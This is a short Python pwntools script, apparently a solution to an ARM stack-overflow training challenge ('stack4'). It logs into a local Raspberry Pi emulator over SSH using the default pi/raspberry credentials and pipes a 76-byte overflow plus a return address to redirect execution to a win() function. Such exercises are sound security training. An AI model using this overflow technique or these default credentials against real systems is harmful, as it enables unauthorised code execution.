#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='localhost', user='pi', password='raspberry', port=5022)
# overflowing the buffer modifies the stack
# win() is at address0001044c <win>: from objdump -d stack3
exploit = b'python -c \'print "a"*76+"L\\x04\\x01\\x00"\' | '
exploit += b'~/binary-exploitation-solution-scripts/azeriaARMchallenges/stack4sol/stack4'
sh = s.shell('bash')
sh.sendline(exploit)
for i in range(2):
    print(sh.recvline())
log.info(sh.recvline().decode('utf-8'))
s.close()